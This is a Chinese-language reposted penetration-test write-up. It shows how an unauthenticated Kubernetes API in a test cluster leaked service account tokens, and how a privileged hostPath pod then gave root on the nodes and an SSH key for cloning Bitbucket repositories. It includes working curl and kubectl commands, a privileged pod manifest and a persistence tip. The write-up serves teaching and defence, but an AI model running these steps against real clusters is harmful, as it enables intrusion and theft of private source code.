---
title: 通过测试用的 Kubernetes 集群访问 Bitbucket
url: https://mp.weixin.qq.com/s/m6VQW3XnDJHt-JsGo30MUw
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:05:25.330853
---

# 通过测试用的 Kubernetes 集群访问 Bitbucket

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0EmjEbXjiczADzQU6x0MGNIjcIPLeR3ozZXsk7Sy5FGY7btUAOrSHPWHBzcdgxmSIn67RtaibjbZG1hglmFluyZwwDZibycAcKDIg/0?wx_fmt=jpeg)

# 通过测试用的 Kubernetes 集群访问 Bitbucket

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FujBj6iaiamY0SePlduiaGc8jS05EHfD0YcR34RabXOlXib0Ecw2YqgACmEYbYlgHYqicRFWicuzTfeYvicHangvjUDSD9tsNMItBZibk/640?wx_fmt=webp&from=appmsg)

我们之前已经报道过渗透测试人员如何查找和分析Kubernetes 集群。在本文中，我们将演示您可以通过此类集群获得哪些类型的访问权限。

在我们一次渗透测试项目中，进入内部网络后，我们发现一台主机使用了一个证书，该证书用于common name: system:kube-apiserver端口 443/TCP 上的服务。它看起来像是一个带有 Kubernetes API 的 Kubernetes 集群节点。

出乎意料的是，这个 API 无需身份验证即可访问（我们只检查了 GET 请求）。我们能够获取命名空间、Pod 以及最令人感兴趣的密钥等数据。我们由此推断这是一个测试用的 Kubernetes 集群。但我们仍然认为它值得我们关注：

```
proxychains4 curl -vk https://<ip_address>/api/v1/namespaces
proxychains4 curl -vk https://<ip_address>/api/v1/nodes
proxychains4 curl -vk https://<ip_address>/api/v1/pods
proxychains4 curl -vk https://<ip_address>/api/v1/secrets
```

我们从密钥中获取了 31 个服务帐户令牌（是的，无需身份验证）。我们研究了这些帐户的权限（集群角色绑定和集群角色对象），发现利用这些帐户，我们可以执行管理集群的任何操作，包括更改服务帐户角色、创建 Pod 以及在 Pod 中执行命令。

为了获得在节点上执行命令的能力，我们创建了一个具有以下配置的 pod（集群中的容器使用来自本地 Docker 注册表的镜像，因此我们指定了其中一个使用的镜像）：

```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: <my-pod>
  name: <my-pod>
spec:
  volumes:
  - name: host-filesystem
    hostPath:
      path: /
  containers:
  - command:
    - sleep
    - 2d
    image: <link_to_image>
    name: <my-pod>
    volumeMounts:
    - mountPath: /mnt/
      name: host-filesystem
    resources: {}
    securityContext:
      privileged: true
      runAsUser: 0
  dnsPolicy: ClusterFirst
  restartPolicy: Always
  nodeName: <node_name>
  hostNetwork: true
  hostPID: true
  hostIPC: true
status: {}
```

创建 pod 的命令：

```
HTTPS_PROXY=socks5://127.0.0.1:1080 kubectl --server=https://<ip_address>:443 --insecure-skip-tls-verify=true --token <token> create -f <pod.yml>
```

创建 pod 后，我们运行bash命令并将根目录更改为节点的根目录：

```
HTTPS_PROXY=socks5://127.0.0.1:1080 kubectl --server=https://<ip_address>:443 --insecure-skip-tls-verify=true --token <token> exec -it <my-pod> -- bash

chroot /mnt
```

这样，我们就获得了节点的 root 权限（为了持久化，我们可以将密钥放在 authorized\_keys 文件中）。集群中有四个节点，因此我们创建了四个 Pod，分别nodeName在每个节点上执行。

在获得其中一个节点的特权访问权限后，我们在文件中找到了一个指向存储库的链接/opt/some-service/config.yaml：

```
https://bitbucket.domain.local/projects/SERVICE/repos/service-back/browse/some/dir/config.java
```

我们在该/home/some-user/.ssh/目录中找到了一个包含私钥的文件identity.bitbucket.domain.local。我们克隆了该仓库，并搜索了其中提及的其他仓库。共找到了 89 个仓库。

```
git clone ssh://git@bitbucket.domain.local/SERVICE/service-back
grep -r -i 'bitbucket.domain.local' ./service-back
```

利用发现的密钥，我们成功访问了之前尝试克隆的代码仓库。我们推测，我们还能找到更多包含客户应用程序源代码的代码仓库，并且可以使用该密钥访问所有这些仓库。

结论：

对于红队来说：即使你意识到自己已经进入了测试环境，也不要放弃主机，四处看看。你可能会发现一些有用的东西，或者扩展你的网络访问权限。

对于蓝队来说：不要忘记测试环境，它们也需要保护。

致所有人：即使你认为某件事不可能（例如，在未进行身份验证的情况下从 Kubernetes API 获取密钥），也值得尝试一下。也许这次会成功。

**END**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GOK5444E8lUYlgUOn9hSvhcgCMj5vFlCJrrmebBx9zeUkTNzmX5q6JswOu8SKoqj6sWVAlVqenRkDFF31HZwWdUNpHiahicssvo/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过